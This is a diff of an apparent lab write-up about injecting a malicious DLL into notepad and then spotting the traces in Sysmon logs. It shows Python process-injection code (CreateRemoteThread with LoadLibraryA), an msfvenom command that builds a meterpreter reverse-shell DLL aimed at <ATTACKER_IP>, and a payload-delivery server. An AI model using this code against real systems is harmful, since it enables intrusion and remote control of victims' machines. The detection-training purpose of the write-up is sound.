@@ -60,35 +60,33 @@ h_kernel32 = kernel32.GetModuleHandleA(b'kernel32.dll')
 load_library = kernel32.GetProcAddress(h_kernel32, b'LoadLibraryA')
 
 # Create remote thread in target process
-kernel32.CreateRemoteThread(h_process, None, 0, load_library, arg_address, 0, None)```
----
+kernel32.CreateRemoteThread(h_process, None, 0, load_library, arg_address, 0, None)
+```
 
-
-The PID of the process changes everytime that a new process is run so was necessary we insert this 
+The PID of the process changes every time that a new process is run, so it was necessary to insert this 
 function to find the PID of the notepad automatically:
----
+
+```python
 def get_notepad_pid():
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'].lower() == 'notepad.exe':
           return proc.info['pid']
    return None
+
 pid = get_notepad_pid()
----
-
-
-
+```
 
 ### Embedding the Payload
 
 Was generated the malicious DLL payload using Metasploit's `msfvenom`:
 
-`bash
+```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f dll > test.dll
-
+```
 
 ### Creating the Executable
 
-Initially, I used PyInstaller to compile the Python script into an executable. However, running the resulting binary on the target machine failed due to environment compatibility issues. 
+Initially, I used PyInstaller to compile the Python script into an executable. However, running the resulting binary on the target machine failed due to environment compatibility issues.  
 To solve this, I used **Wine** on Kali Linux to simulate a Windows environment and generate a compatible executable.
 
 ![Image](https://github.com/user-attachments/assets/2dba5d56-2ce5-4e48-bb1f-ca5d9d127634)
@@ -97,9 +95,9 @@ To solve this, I used **Wine** on Kali Linux to simulate a Windows environment a
 
 To deliver the payload, I used a simple Python HTTP server on the attacker machine and set up a listener.
 
-bash
+```bash
 python3 -m http.server 8000
-
+```
 
 ![Image](https://github.com/user-attachments/assets/f0aec13c-2cd1-43fc-a262-b08449a5e8a7)
 
@@ -116,100 +114,57 @@ Despite disabling basic Windows Defender features, getting a stable reverse conn
 ## Log Analysis
 
 ### Event ID 1: Process Creation
--- ID 1 --
 
-RuleName - 
-  UtcTime 2025-05-08 13:21:20.798 
-  ProcessGuid {68681664-afd0-681c-ca01-000000001900} 
-  ProcessId 6392 
-  Image C:\Users\home\Downloads\injection.exe 
-  FileVersion - 
-  Description - 
-  Product - 
-  Company - 
-  OriginalFileName - 
-  CommandLine "C:\Users\home\Downloads\injection.exe"  
-  CurrentDirectory C:\Users\home\Downloads\ 
-  User DESKTOP-OBMB5FQ\home 
-  LogonGuid {68681664-9f87-681c-f0f1-400000000000} 
-  LogonId 0x40f1f0 
-  TerminalSessionId 1 
-  IntegrityLevel Medium 
-  Hashes MD5=7F4A3A25ADE184472E81C3BB12D4FB18,SHA256=8542D740670D511366D891E3E100DA1F9DC11206CE3D2B353FCD1D2860806BA4,IMPHASH=33742414196E45B8B306A928E178F844 
-  ParentProcessGuid {68681664-9f89-681c-c600-000000001900} 
-  ParentProcessId 5448 
-  ParentImage C:\Windows\explorer.exe 
-  ParentCommandLine C:\Windows\Explorer.EXE 
-  ParentUser DESKTOP-OBMB5FQ\home 
+```
+UtcTime: 2025-05-08 13:21:20.798
+ProcessId: 6392
+Image: C:\Users\home\Downloads\injection.exe
+ParentImage: C:\Windows\explorer.exe
+Hashes: MD5=..., SHA256=...
+```
 
-
-**Explanation**: Event ID 1 logs every process creation. Although not inherently malicious, indicators like missing file metadata (Company, Description) and hash verification help identify suspicious files.
+**Explanation**: Event ID 1 logs every process creation. Although not inherently malicious, indicators like missing file metadata and hash verification help identify suspicious files.  
 The parent process being `explorer.exe` suggests user interaction (manual execution).
 
 ### Event ID 13: Registry Modification
 
--- ID 13 -- 
+```
+UtcTime: 2025-05-08 13:21:22.977
+Image: C:\Windows\system32\svchost.exe
+TargetObject: HKU\...\AppCompatFlags\Compatibility Assistant\Store\...injection.exe
+```
 
-  RuleName InvDB 
-  EventType SetValue 
-  UtcTime 2025-05-08 13:21:22.977 
-  ProcessGuid {68681664-9f48-681c-ac00-000000001900} 
-  ProcessId 1304 
-  Image C:\Windows\system32\svchost.exe 
-  TargetObject HKU\S-1-5-21-1708299313-952822903-2634392219-1001\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store\C:\Users\home\Downloads\injection.exe 
-  Details Binary Data 
-  User NT AUTHORITY\SYSTEM 
-
-
-**Explanation**: This entry shows `svchost.exe` modifying the registry to store information about the executed file. Windows uses this Compatibility Assistant key when unusual behavior is detected. 
-It's a passive but strong indicator that the file was executed.
+**Explanation**: This shows `svchost.exe` modifying the registry to store information about the executed file.  
+Windows uses this Compatibility Assistant key when unusual behavior is detected.
 
 ### Event ID 5: Process Terminated
 
--- ID 5 --
+```
+UtcTime: 2025-05-08 13:21:20.958
+ProcessId: 6392
+Image: C:\Users\home\Downloads\injection.exe
+```
 
- RuleName - 
-  UtcTime 2025-05-08 13:21:20.958 
-  ProcessGuid {68681664-afd0-681c-ca01-000000001900} 
-  ProcessId 6392 
-  Image C:\Users\home\Downloads\injection.exe 
-  User DESKTOP-OBMB5FQ\home 
-
-**Explanation**: The process was terminated shortly after execution, potentially due to Windows defenses or a code error. 
-Troubleshooting this issue was beyond the scope of this article, so a simpler payload was created to continue the lab.
+**Explanation**: The process was terminated shortly after execution, possibly due to Windows defenses or a code error.
 
 ![Image](https://github.com/user-attachments/assets/fdcbacff-886d-4848-aa5e-cea5c3c700f4)
 
 ### Event ID 3: Network Connection
 
-RuleName Usermode 
-  UtcTime 2025-05-08 17:16:34.953 
-  ProcessGuid {68681664-e6f2-681c-6a02-000000001d00} 
-  ProcessId 5104 
-  Image C:\Users\home\Downloads\final.exe 
-  User DESKTOP-OBMB5FQ\home 
-  Protocol tcp 
-  Initiated true 
-  SourceIsIpv6 false 
-  SourceIp 10.0.2.15 
-  SourceHostname DESKTOP-OBMB5FQ.lan 
-  SourcePort 50194 
-  SourcePortName - 
-  DestinationIsIpv6 false 
-  DestinationIp 192.168.1.201 
-  DestinationHostname kali.lan 
-  DestinationPort 4444 
-  DestinationPortName -
+```
+UtcTime: 2025-05-08 17:16:34.953
+ProcessId: 5104
+Image: C:\Users\home\Downloads\final.exe
+DestinationIp: 192.168.1.201
+DestinationPort: 4444
+```
 
-**Explanation**: One of the most critical Sysmon logs for detection, Event ID 3 tracks outbound network connections. 
-This log confirms the reverse shell behavior, as `final.exe` attempts to connect to the attacker's listener on port 4444, commonly used by tools like Metasploit.
+**Explanation**: This log confirms the reverse shell behavior. `final.exe` attempts to connect to the attacker's listener, typically used by tools like Metasploit.
 
-
+---
 
 ## Conclusion
 
-This lab demonstrates that even basic malware leaves detectable traces in Sysmon logs. Events such as process creation, registry modification, and network activity are powerful indicators for defenders. 
+This lab demonstrates that even basic malware leaves detectable traces in Sysmon logs.  
+Events such as process creation, registry modification, and network activity are powerful indicators for defenders.  
 Despite some execution challenges, the experiment shows the effectiveness of endpoint monitoring and highlights the importance of log analysis for incident detection.
-
-
-
